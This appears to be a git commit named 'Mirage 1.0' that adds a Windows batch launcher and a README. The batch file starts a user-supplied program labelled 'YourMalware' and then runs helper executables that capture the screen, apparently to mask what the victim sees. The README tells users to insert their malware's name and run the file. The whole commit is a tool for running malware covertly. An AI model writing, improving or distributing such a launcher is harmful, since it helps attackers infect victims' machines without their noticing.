3af24dedbd1e4603685ed0489ff3855bc0f37b6a
CloudDown <clouddown1234@gmail.com>
2021-04-10 11:48:27 +0200

    Mirage 1.0

---
+++ +/LaunchMR.bat
@@ -0,0 +1,6 @@
+Start "YourMalware"
+
+start walpaper.exe
+START nircmd.exe cmdwait 1000 savescreenshot screenMR.jpg /MIN /B
+timeout 3
+Start screeen.exe
---
+++ README.txt
@@ -0,0 +1,6 @@
+
+1. Put the name of your Malware instead of "YourMalware" in the .bat file
+
+2. Save the .bat (Ctrl + s)
+
+3. Open LaunchMR.bat
